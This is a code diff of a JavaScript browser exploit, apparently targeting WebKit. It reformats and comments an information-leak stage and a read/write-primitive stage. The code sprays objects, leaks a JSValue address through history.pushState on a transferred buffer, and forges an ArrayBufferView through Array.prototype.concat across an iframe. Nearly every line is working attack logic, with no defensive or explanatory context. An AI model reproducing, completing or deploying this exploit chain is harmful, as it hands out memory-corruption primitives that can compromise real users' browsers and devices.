@@ -140,7 +140,6 @@ var fail = function() {
     alert.apply(null, arguments);
     throw "fail";
 }
-
 /////////////////// STAGE 1: INFOLEAK ///////////////////
 
 failed = false
@@ -151,12 +150,7 @@ for(var i = 0; i < 0x4000; i++) {
 }
 
 // Target JSObject for overlap
-var tgt = {
-    a: 0,
-    b: 0,
-    c: 0,
-    d: 0
-}
+var tgt = {a: 0, b: 0, c: 0, d: 0}
 
 for(var i = 0; i < 0x400; i++) {
   nogc.push({a: 0, b: 0, c: 0, d: 0});
@@ -168,58 +162,58 @@ postMessage("", "*", [y.data.buffer]);
 // Spray properties to ensure object is fastmalloc()'d and can be found easily later
 var props = {};
 
-for (var i = 0;
-    (i < (0x4000 / 2));) {
-    props[i++] = {
-        value: 0x42424242
-    };
-    props[i++] = {
-        value: tgt
-    };
+for(var i = 0; (i < (0x4000 / 2));) {
+  props[i++] = {value: 0x42424242};
+  props[i++] = {value: tgt};
 }
 
-var foundLeak = undefined;
-var foundIndex = 0;
-var maxCount = 0x100;
+// Find address of JSValue by leaking one of the JSObject's we sprayed
+var foundLeak   = undefined;
+var foundIndex  = 0;
+var maxCount    = 0x100;
 
-while (foundLeak == undefined && maxCount > 0) {
-    maxCount--;
+// Only check 256 times, should rarely fail
+while(foundLeak == undefined && maxCount > 0) {
+  maxCount--;
 
-    history.pushState(y, "");
+  history.pushState(y, "");
 
-    Object.defineProperties({}, props);
+  Object.defineProperties({}, props);
 
-    var leak = new Uint32Array(history.state.data.buffer);
+  var leak = new Uint32Array(history.state.data.buffer);
 
-    for (var i = 0; i < leak.length - 6; i++) {
-        if (
-            leak[i]       == 0x42424242 &&
-            leak[i + 0x1] == 0xFFFF0000 &&
-            leak[i + 0x2] == 0x00000000 &&
-            leak[i + 0x3] == 0x00000000 &&
-            leak[i + 0x4] == 0x00000000 &&
-            leak[i + 0x5] == 0x00000000 &&
-            leak[i + 0x6] == 0x0000000E &&
-            leak[i + 0x7] == 0x00000000 &&
-            leak[i + 0xA] == 0x00000000 &&
-            leak[i + 0xB] == 0x00000000 &&
-            leak[i + 0xC] == 0x00000000 &&
-            leak[i + 0xD] == 0x00000000 &&
-            leak[i + 0xE] == 0x0000000E &&
-            leak[i + 0xF] == 0x00000000
-        ) {
-            foundIndex = i;
-            foundLeak = leak;
-            break;
-        }
+  // Check memory against known values such as 0x42424242 JSValue and empty JSObject values
+  for(var i = 0; i < leak.length - 6; i++) {
+    if(
+      leak[i]       == 0x42424242 &&
+      leak[i + 0x1] == 0xFFFF0000 &&
+      leak[i + 0x2] == 0x00000000 &&
+      leak[i + 0x3] == 0x00000000 &&
+      leak[i + 0x4] == 0x00000000 &&
+      leak[i + 0x5] == 0x00000000 &&
+      leak[i + 0x6] == 0x0000000E &&
+      leak[i + 0x7] == 0x00000000 &&
+      leak[i + 0xA] == 0x00000000 &&
+      leak[i + 0xB] == 0x00000000 &&
+      leak[i + 0xC] == 0x00000000 &&
+      leak[i + 0xD] == 0x00000000 &&
+      leak[i + 0xE] == 0x0000000E &&
+      leak[i + 0xF] == 0x00000000
+    ) {
+      foundIndex = i;
+      foundLeak = leak;
+      break;
     }
+  }
 }
 
-if (!foundLeak) {
-    failed = true
-    fail("Failed to find leak!")
+// Oh no :(
+if(!foundLeak) {
+  failed = true
+  fail("Failed to find leak!")
 }
 
+// Get first JSValue
 var firstLeak = Array.prototype.slice.call(foundLeak, foundIndex, foundIndex + 0x40);
 var leakJSVal = new int64(firstLeak[8], firstLeak[9]);
 leakJSVal.toString();
@@ -305,10 +299,10 @@ var dgc = function() {
 
     /////////////////// STAGE 5: READ/WRITE PRIMITIVE ///////////////////
 Array.prototype.__defineGetter__(100, () => 1);
-
 var f = document.body.appendChild(document.createElement('iframe'));
 var a = new f.contentWindow.Array(13.37, 13.37);
 var b = new f.contentWindow.Array(u2d(leakJSVal.low + 0x10, leakJSVal.hi), 13.37);
+
 
 var master = new Uint32Array(0x1000);
 var slave = new Uint32Array(0x1000);
@@ -318,13 +312,11 @@ var leakval_helper = [slave, 2, 3, 4, 5, 6, 7, 8, 9, 10];
 // Create fake ArrayBufferView
 tgt.a = u2d(4096, 0x1602300);
 tgt.b = 0;
-tgt.c = leakval_helper;
 tgt.d = 0x1337;
 
 var c = Array.prototype.concat.call(a, b);
 document.body.removeChild(f);
 var hax = c[0];
-c[0] = 0;
 
 tgt.c = c;
 
